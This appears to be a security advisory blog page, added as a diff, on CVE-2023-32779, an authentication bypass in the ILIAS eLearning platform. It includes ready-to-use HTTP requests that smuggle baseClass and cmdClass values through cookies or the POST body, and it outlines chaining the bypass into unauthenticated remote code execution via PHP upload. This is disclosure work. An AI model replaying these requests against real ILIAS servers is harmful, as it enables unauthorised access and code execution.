@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>[Advisory - ILIAS eLearning platform] Authentication bypass | Red vs. Blue Shell</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="[Advisory - ILIAS eLearning platform] Authentication bypass" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Vulnerability overview During the startup of a request ILIAS calls the resumeUserSession function to check if there is a valid user." />
+<meta property="og:description" content="Vulnerability overview During the startup of a request ILIAS calls the resumeUserSession function to check if there is a valid user." />
+<link rel="canonical" href="/advisory/2023/02/02/ilias-auth-bypass.html" />
+<meta property="og:url" content="/advisory/2023/02/02/ilias-auth-bypass.html" />
+<meta property="og:site_name" content="Red vs. Blue Shell" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-02-02T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[Advisory - ILIAS eLearning platform] Authentication bypass" />
+<script type="application/ld+json">
+{"description":"Vulnerability overview During the startup of a request ILIAS calls the resumeUserSession function to check if there is a valid user.","@type":"BlogPosting","headline":"[Advisory - ILIAS eLearning platform] Authentication bypass","dateModified":"2023-02-02T00:00:00+00:00","datePublished":"2023-02-02T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"/advisory/2023/02/02/ilias-auth-bypass.html"},"url":"/advisory/2023/02/02/ilias-auth-bypass.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Red vs. Blue Shell" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Red vs. Blue Shell</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">[Advisory - ILIAS eLearning platform] Authentication bypass</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-02-02T00:00:00+00:00" itemprop="datePublished">Feb 2, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody"><p class="advisory-details">
+
+<table>
+    <tr>
+        <th>Product:</th>
+        <th>ILIAS eLearning platform</th>
+    </tr>
+    <tr>
+        <th>Homepage:</th>
+        <th><a href="https://www.ilias.de/en/about-ilias/">https://www.ilias.de/en/about-ilias/</a></th>
+    </tr>
+
+
+    <tr>
+        <th>CVE Number:</th>
+        <th><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32779">CVE-2023-32779</a></th>
+    </tr>
+
+
+    
+    <tr>
+        <th>Vulnerable version:</th>
+        <th><= 7.20, <= 8.1</th>
+    </tr>
+    <tr>
+        <th>Fixed version:</th>
+        <th>7.21, 8.2</th>
+    </tr>
+    <tr>
+        <th>CVSS Score:</th>
+        <th><span class="Medium">Medium 6.5</span> - <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</a>
+        </th>
+    </tr>
+    <tr>
+        <th>Found:</th><th>Feb 2, 2023</th>
+    </tr>
+</table>
+
+</p>
+
+Back to: <a href="/advisory/2023/05/24/ilias-multiple-vulnerabilities.html">[Advisory - ILIAS] Multiple vulnerabilities (LFI, Auth bypass, RCE)</a>
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+<p>During the startup of a request <code class="language-plaintext highlighter-rouge">ILIAS</code> calls the <code class="language-plaintext highlighter-rouge">resumeUserSession</code> function to check if there is a valid user.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># FILE: Services\Init\classes\class.ilInitialisation.php</span>
+<span class="cd">/**
+ * Resume an existing user session
+ */</span>
+<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">resumeUserSession</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$DIC</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ilAuthUtils</span><span class="o">::</span><span class="nf">isAuthenticationForced</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">ilAuthUtils</span><span class="o">::</span><span class="nf">handleForcedAuthentication</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span>
+        <span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'DIC'</span><span class="p">][</span><span class="s1">'ilAuthSession'</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">isAuthenticated</span><span class="p">()</span> <span class="k">or</span>
+        <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'DIC'</span><span class="p">][</span><span class="s1">'ilAuthSession'</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">isExpired</span><span class="p">()</span>
+    <span class="p">)</span> <span class="p">{</span>
+        <span class="n">ilLoggerFactory</span><span class="o">::</span><span class="nf">getLogger</span><span class="p">(</span><span class="s1">'init'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">debug</span><span class="p">(</span><span class="s1">'Current session is invalid: '</span> <span class="mf">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'DIC'</span><span class="p">][</span><span class="s1">'ilAuthSession'</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">getId</span><span class="p">());</span>
+        <span class="nv">$current_script</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"PHP_SELF"</span><span class="p">],</span> <span class="s2">"/"</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nf">blockedAuthentication</span><span class="p">(</span><span class="nv">$current_script</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">ilLoggerFactory</span><span class="o">::</span><span class="nf">getLogger</span><span class="p">(</span><span class="s1">'init'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">debug</span><span class="p">(</span><span class="s1">'Authentication is started in current script.'</span><span class="p">);</span>
+            <span class="c1">// nothing todo: authentication is done in current script</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="k">self</span><span class="o">::</span><span class="nf">handleAuthenticationFail</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="c1">// valid session</span>
+
+    <span class="k">return</span> <span class="k">self</span><span class="o">::</span><span class="nf">initUserAccount</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If the <code class="language-plaintext highlighter-rouge">ilAuthSession</code> is not authenticated or expired the function <code class="language-plaintext highlighter-rouge">self::handleAuthenticationFail</code> would be called and the request aborted. But there are pages, which do not required a valid user session. The function <code class="language-plaintext highlighter-rouge">blockedAuthentication</code> is called to test, if this is true for the current request.</p>
+
+<p>There are a bunch of checks inside this function. One of them is the following.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># FILE: Services\Init\classes\class.ilInitialisation.php</span>
+<span class="cd">/**
+ * Block authentication based on current request
+ *
+ * @return boolean
+ */</span>
+<span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="n">blockedAuthentication</span><span class="p">(</span><span class="nv">$a_current_script</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// ......</span>
+    <span class="nv">$requestBaseClass</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">((</span><span class="n">string</span><span class="p">)</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'baseClass'</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$requestBaseClass</span> <span class="o">==</span> <span class="nb">strtolower</span><span class="p">(</span><span class="n">ilStartUpGUI</span><span class="o">::</span><span class="n">class</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$requestCmdClass</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">((</span><span class="n">string</span><span class="p">)</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmdClass'</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span>
+            <span class="nv">$requestCmdClass</span> <span class="o">==</span> <span class="nb">strtolower</span><span class="p">(</span><span class="n">ilAccountRegistrationGUI</span><span class="o">::</span><span class="n">class</span><span class="p">)</span> <span class="o">||</span>
+            <span class="nv">$requestCmdClass</span> <span class="o">==</span> <span class="nb">strtolower</span><span class="p">(</span><span class="n">ilPasswordAssistanceGUI</span><span class="o">::</span><span class="n">class</span><span class="p">)</span>
+        <span class="p">)</span> <span class="p">{</span>
+            <span class="n">ilLoggerFactory</span><span class="o">::</span><span class="nf">getLogger</span><span class="p">(</span><span class="s1">'auth'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">debug</span><span class="p">(</span><span class="s1">'Blocked authentication for cmdClass: '</span> <span class="mf">.</span> <span class="nv">$requestCmdClass</span><span class="p">);</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="c1">// ......</span>
+</code></pre></div></div>
+
+<p>It checks if the parameter <code class="language-plaintext highlighter-rouge">baseClass</code> == <code class="language-plaintext highlighter-rouge">ilStartUpGUI</code> and the <code class="language-plaintext highlighter-rouge">cmdClass</code> is in [<code class="language-plaintext highlighter-rouge">ilAccountRegistrationGUI</code>, <code class="language-plaintext highlighter-rouge">ilPasswordAssistanceGUI</code>]. 
+The important detailed about this code is that the value of these parameters is obtained via the superglobal variable <code class="language-plaintext highlighter-rouge">$_REQUEST</code> (see: <a href="https://www.php.net/manual/en/reserved.variables.request.php">PHP - $_REQUEST</a>).</p>
+
+<blockquote>
+  <p>An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE.</p>
+</blockquote>
+
+<p>For example there is no valid session required for the following request.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/ilias.php?lang=de&amp;client_id=myilias&amp;cmdClass=ilpasswordassistancegui&amp;cmdNode=zp:sz&amp;baseClass=ilStartUpGUI</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ilias.local:9080</span>
+
+</code></pre></div></div>
+
+<h2 id="request-routing">Request routing</h2>
+<p>The request routing in <code class="language-plaintext highlighter-rouge">ILIAS</code> is implemented with the following parameters <code class="language-plaintext highlighter-rouge">baseclass</code>, <code class="language-plaintext highlighter-rouge">cmdClass</code>  and <code class="language-plaintext highlighter-rouge">cmd</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code># FILE: ilias.php
+<span class="cp">&lt;?php</span>
+<span class="cm">/* Copyright (c) 1998-2009 ILIAS open source, Extended GPL, see docs/LICENSE */</span>
+
+<span class="cd">/**
+* ilias.php. main script.
+*
+* If you want to use this script your base class must be declared
+* within modules.xml.
+*
+* @author Alex Killing &lt;alex.killing@gmx.de&gt;
+* @version $Id$
+*
+*/</span>
+
+<span class="k">require_once</span><span class="p">(</span><span class="s2">"Services/Init/classes/class.ilInitialisation.php"</span><span class="p">);</span>
+<span class="n">ilInitialisation</span><span class="o">::</span><span class="nf">initILIAS</span><span class="p">();</span>
+
+<span class="cd">/**
+ * @var $DIC \ILIAS\DI\Container
+ */</span>
+<span class="k">global</span> <span class="nv">$DIC</span><span class="p">,</span> <span class="nv">$ilBench</span><span class="p">;</span>
+
+<span class="nv">$DIC</span><span class="o">-&gt;</span><span class="nf">ctrl</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">callBaseClass</span><span class="p">();</span>
+<span class="nv">$ilBench</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">();</span>
+
+</code></pre></div></div>
+
+<p>The implementation of <code class="language-plaintext highlighter-rouge">callBaseClass</code> creates and calls the base class.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># FILE: Services/UICore/classes/class.ilCtrl.php</span>
+<span class="cd">/**
+ * Calls base class of current request. The base class is
+ * passed via $_GET["baseClass"] and is the first class in
+ * the call sequence of the request. Do not call this method
+ * within other scripts than ilias.php.
+ * @throws ilCtrlException
+ */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="n">callBaseClass</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$DIC</span><span class="p">;</span>
+
+    <span class="nv">$ilDB</span> <span class="o">=</span> <span class="nv">$DIC</span><span class="o">-&gt;</span><span class="nf">database</span><span class="p">();</span>
+    
+    <span class="nv">$baseClass</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"baseClass"</span><span class="p">]);</span>
+
+    <span class="nv">$module_class</span> <span class="o">=</span> <span class="n">ilCachedCtrl</span><span class="o">::</span><span class="nf">getInstance</span><span class="p">();</span>
+    <span class="nv">$mc_rec</span> <span class="o">=</span> <span class="nv">$module_class</span><span class="o">-&gt;</span><span class="nf">lookupModuleClass</span><span class="p">(</span><span class="nv">$baseClass</span><span class="p">);</span>
+    <span class="c1">//....</span>
+    <span class="c1">// forward processing to base class</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCallStructure</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$baseClass</span><span class="p">));</span>
+    <span class="nv">$base_class_gui</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">();</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">forwardCommand</span><span class="p">(</span><span class="nv">$base_class_gui</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function uses the superglobal variable <code class="language-plaintext highlighter-rouge">$_GET</code> to obtain the value of the key <code class="language-plaintext highlighter-rouge">baseClass</code>.</p>
+
+<h1 id="proof-of-concept">Proof of concept</h1>
+<p>As the value of the key <code class="language-plaintext highlighter-rouge">baseClass</code> can have different values in the superglobal variables <code class="language-plaintext highlighter-rouge">$_GET</code> and <code class="language-plaintext highlighter-rouge">$_REQUEST</code> pages can be accessed, which would required a valid user session.</p>
+
+<p>The following request for example redirects to the public page.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/ilias.php?baseClass=ilDashboardGUI&amp;cmd=jumpToSelectedItems</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ilias.local:9080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ilias.local:9080/login.php?client_id=myilias&amp;cmd=force_login&amp;lang=de</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">ilClientId=myilias; PHPSESSID=Unauth</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 28 Apr 2023 05:39:52 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.33</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c7058622b3a4df0c5a227effc4aac2f7; path=/; HttpOnly</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://ilias.local:9080/ilias.php?baseClass=ilrepositorygui&amp;reloadpublic=1&amp;cmd=frameset&amp;ref_id=1</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+</code></pre></div></div>
+
+<p>But by adding the following cookies: <code class="language-plaintext highlighter-rouge">;baseClass=ilStartupGUI;cmdClass=ilPasswordAssistanceGUI</code> it is possible to bypass (<code class="language-plaintext highlighter-rouge">blockedAuthentication</code> returns <code class="language-plaintext highlighter-rouge">true</code>) the auth check and access the <code class="language-plaintext highlighter-rouge">ilDashboardGUI</code> base class (although an exception is thrown).</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/ilias.php?baseClass=ilDashboardGUI&amp;cmd=jumpToSelectedItems</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ilias.local:9080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ilias.local:9080/login.php?client_id=myilias&amp;cmd=force_login&amp;lang=de</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">ilClientId=myilias; PHPSESSID=Unauth; ;baseClass=ilStartupGUI;cmdClass=ilPasswordAssistanceGUI</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 28 Apr 2023 05:40:07 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.33</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">P3P</span><span class="p">:</span> <span class="s">CP="CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS IND UNI COM NAV INT CNT STA PRE"</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://ilias.local:9080/error.php</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">22403</span>
+
+
+<span class="nt">&lt;td</span> <span class="na">bgcolor=</span><span class="s">'#eeeeec'</span><span class="nt">&gt;</span>Whoops\Run-&gt;handleException( <span class="nt">&lt;span&gt;</span>$exception = <span class="nt">&lt;/span&gt;&lt;span&gt;</span>class TypeError { protected $message = <span class="ni">&amp;#39;</span>Argument 1 passed to DashboardLayoutProvider::{closure}() must be an instance of ILIAS\\UI\\Component\\MainControls\\MainBar, null given, called in /var/www/html/src/GlobalScreen/Scope/Layout/Provider/PagePart/DecoratedPagePartProvider.php on line 75<span class="ni">&amp;#39;</span>; private ${Error}string = <span class="ni">&amp;#39;&amp;#39;</span>; protected $code = 0; protected $file = <span class="ni">&amp;#39;</span>/var/www/html/Services/Dashboard/GlobalScreen/classes/DashboardLayoutProvider.php<span class="ni">&amp;#39;</span>; protected $line = 38; private ${Error}trace = [0 =<span class="ni">&amp;gt;</span> [...], 1 =<span class="ni">&amp;gt;</span> [...], 2 =<span class="ni">&amp;gt;</span> [...], 3 =<span class="ni">&amp;gt;</span> [...], 4 =<span class="ni">&amp;gt;</span> [...], 5 =<span class="ni">&amp;gt;</span> [...], 6 =<span class="ni">&amp;gt;</span> [...], 7 =<span class="ni">&amp;gt;</span> [...], 8 =<span class="ni">&amp;gt;</span> [...], 9 =<span class="ni">&amp;gt;</span> [...], 10 =<span class="ni">&amp;gt;</span> [...], 11 =<span class="ni">&amp;gt;</span> [...], 12 =<span class="ni">&amp;gt;</span> [...], 13 =<span class="ni">&amp;gt;</span> [...], 14 =<span class="ni">&amp;gt;</span> [...], 15 =<span class="ni">&amp;gt;</span> [...]]; private ${Error}previous = NULL; public $xdebug_message = <span class="ni">&amp;#39;&amp;lt;</span>tr<span class="ni">&amp;gt;&amp;lt;</span>th align=\<span class="ni">&amp;#39;</span>left\<span class="ni">&amp;#39;</span> bgcolor=\<span class="ni">&amp;#39;</span>#f57900\<span class="ni">&amp;#39;</span> colspan=<span class="ni">&amp;quot;</span>5<span class="ni">&amp;quot;&amp;gt;&amp;lt;</span>span style=\<span class="ni">&amp;#39;</span>background-color: #cc0000; color: #fce94f; font-size: x-large;\<span class="ni">&amp;#39;&amp;gt;</span>( ! )<span class="ni">&amp;lt;</span>/span<span class="ni">&amp;gt;</span> TypeError: Argument 1 passed to DashboardLayoutProvider::{closure}() must be an instance of ILIAS\\UI\\Component\\MainControls\\MainBar, null given, called in /var/www/html/src/GlobalScreen/Scope/Layout/Provider/PagePart/DecoratedPagePartProvider.php on line 75 in /var/www/html/Services/Dashboard/GlobalScreen/classes/DashboardLayoutProvider.php on line <span class="ni">&amp;lt;</span>i<span class="ni">&amp;gt;</span>38<span class="ni">&amp;lt;</span>/i<span class="ni">&amp;gt;&amp;lt;&amp;#39;</span> }<span class="nt">&lt;/span&gt;</span>
+</code></pre></div></div>
+
+<p><strong>Note</strong>: 
+It can be configured if cookies are used for the <code class="language-plaintext highlighter-rouge">$_REQUEST</code> variable.</p>
+
+<blockquote>
+  <p>Note:</p>
+
+  <p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote user and cannot be trusted. The presence and order of variables listed in this array is defined according to the PHP request_order, and variables_order configuration directives.</p>
+</blockquote>
+
+<p>See: <a href="https://www.php.net/manual/en/ini.core.php#ini.request-order">PHP ini - request_order</a> and <a href="https://www.php.net/manual/en/ini.core.php#ini.variables-order">PHP ini - variables_order</a></p>
+
+<h2 id="unauthenticated-remote-command-execution">Unauthenticated remote command execution</h2>
+<p>This vulnerability can be chained with <code class="language-plaintext highlighter-rouge">CVE-2023-32778</code>, which allows an attacker to execute code on the server, even without valid credentials.</p>
+
+<p>As a first step a new <code class="language-plaintext highlighter-rouge">Portfolio</code> object has to be created.</p>
+
+<p><strong>Note</strong>: 
+This request passes the <code class="language-plaintext highlighter-rouge">baseClass</code> and <code class="language-plaintext highlighter-rouge">cmdClass</code> via the <code class="language-plaintext highlighter-rouge">POST</code> body instead of cookies.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/ilias.php?new_type=prtf&amp;cmd=post&amp;cmdClass=ilobjportfoliogui&amp;cmdNode=99:ve:p6&amp;baseClass=ilDashboardGUI&amp;rtoken=441c440acdd7ad00179ed6795b42e7f6</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ilias.local:9080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">179</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://ilias.local:9080</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ilias.local:9080/ilias.php?new_type=prtf&amp;cmd=post&amp;cmdClass=ilobjportfoliogui&amp;cmdNode=99:ve:p6&amp;baseClass=ilDashboardGUI&amp;rtoken=441c440acdd7ad00179ed6795b42e7f6</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">ilClientId=myilias; PHPSESSID=Unauth;</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+title=FooBar-Portfolio-unauth&amp;mode=mode_scratch&amp;ptype=page&amp;fpage=FooBar-PortfolioTitle-unauth&amp;blog=&amp;cmd%5Bsave%5D=Erstellen&amp;baseClass=ilStartupGUI&amp;cmdClass=ilPasswordAssistanceGUI
+</code></pre></div></div>
+
+<p>The response which redirectes to the new object with ID <code class="language-plaintext highlighter-rouge">404</code>.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 28 Apr 2023 06:25:00 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.33</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://ilias.local:9080/ilias.php?prt_id=404&amp;cmd=view&amp;cmdClass=ilobjportfoliogui&amp;cmdNode=99:ve:p6&amp;baseClass=ilDashboardGUI</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+</code></pre></div></div>
+
+<p><img src="/assets/ilias-2023/new-portfolio-unauth.png" alt="New portfolio" /></p>
+
+<p>Then the following steps have to be done (same as in the referenced advisory):</p>
+
+<ul>
+  <li>Create media object in page</li>
+  <li>Upload a ZIP file with the <code class="language-plaintext highlighter-rouge">PHP</code> code to run</li>
+  <li>Unzip the uploaded file</li>
+  <li>Get the <code class="language-plaintext highlighter-rouge">mobfs</code> ID and run the script</li>
+</ul>
+
+<p>For each request the parameters <code class="language-plaintext highlighter-rouge">baseClass=ilStartupGUI&amp;cmdClass=ilPasswordAssistanceGUI</code> have to be added.</p>
+
+
+
+  </div>
+
+  <a class="u-url" href="/advisory/2023/02/02/ilias-auth-bypass.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
